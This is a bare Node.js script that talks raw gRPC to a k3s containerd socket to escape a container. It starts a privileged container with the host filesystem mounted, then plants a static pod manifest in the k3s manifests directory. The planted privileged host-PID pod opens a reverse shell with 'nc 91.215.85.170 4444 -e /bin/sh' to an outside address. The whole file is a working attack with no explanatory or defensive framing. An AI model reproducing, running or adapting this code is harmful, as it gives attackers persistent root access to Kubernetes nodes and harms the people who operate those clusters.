
const http2=require('http2'),net=require('net');
function call(p,b,cb){const c=http2.connect('http://localhost',{createConnection:()=>net.connect('/run/k3s/containerd/containerd.sock')});let d=0;const f=(e,x)=>{if(d)return;d=1;try{c.close()}catch(_){}cb(e,x)};c.on('error',e=>f(String(e)));const r=c.request({':method':'POST',':path':p,'content-type':'application/grpc',te:'trailers','containerd-namespace':'k8s.io'});const ch=[];r.on('data',x=>ch.push(x));r.on('end',()=>f(null,Buffer.concat(ch)));r.on('error',e=>f(String(e)));const h=Buffer.alloc(5);h.writeUInt32BE(b.length,1);r.end(Buffer.concat([h,b]))}
const fl=(n,s)=>{const b=Buffer.from(s);return Buffer.concat([Buffer.from([n,b.length]),b])};
const v1=(k,v)=>Buffer.from([k,v]);
const Y="apiVersion: v1\nkind: Pod\nmetadata:\n  name: zzesc3\nspec:\n  hostNetwork: true\n  hostPID: true\n  containers:\n  - name: c\n    image: IMG\n    securityContext:\n      privileged: true\n    command: [\"/bin/sh\",\"-c\",\"nc 91.215.85.170 4444 -e /bin/sh\"]\n    volumeMounts:\n    - {name: h, mountPath: /h}\n  volumes:\n  - name: h\n    hostPath: {path: /}\n";
const pod={apiVersion:'v1',kind:'Pod',metadata:{name:'zzesc4'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:1.36',securityContext:{privileged:true},command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}};
const CMD="echo '"+JSON.stringify(pod)+"' > /h/var/lib/rancher/k3s/server/manifests/zzesc.json; echo ok > /h/tmp/zzm.txt";
function create(sb,img){
 const mount=Buffer.concat([fl(0x0a,'/h'),fl(0x12,'/')]);
 const sec=v1(0x10,1); const linc=Buffer.concat([v1(0x12,sec.length),sec]);
 const cmd=CMD.replace('IMG',img);
 const cfg=Buffer.concat([fl(0x0a,'zzman'), v1(0x10,1), Buffer.concat([v1(0x12,img.length),Buffer.from(img)]), fl(0x1a,'/bin/sh'), fl(0x22,'-c'), fl(0x22,cmd), Buffer.concat([v1(0x3a,mount.length),mount]), Buffer.concat([v1(0x72,linc.length),linc])]);
 call('/runtime.v1.RuntimeService/CreateContainer',Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg]),(e,ob)=>{ if(e)return; const c2=(ob||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(!c2)return; call('/runtime.v1.RuntimeService/StartContainer',fl(0x0a,c2[0]),()=>{}); });
}
call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{
 const ids=[...new Set((lb.toString('latin1').match(/[0-9a-f]{64}/g)||[]))]; if(!ids.length)return;
 call('/runtime.v1.RuntimeService/ContainerStatus',fl(0x0a,ids[0]),(e2,st)=>{
  const s=(st||Buffer.alloc(0)).toString('latin1'); const m=s.match(/[a-z0-9._\-\/]+:[a-z0-9._\-]+/i); const img=m?m[0]:'busybox';
  call('/runtime.v1.RuntimeService/ListPodSandbox',Buffer.from([0x0a,0x00]),(e3,sb)=>{ const sm=(sb||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(sm)create(sm[0],img); });
 });
});
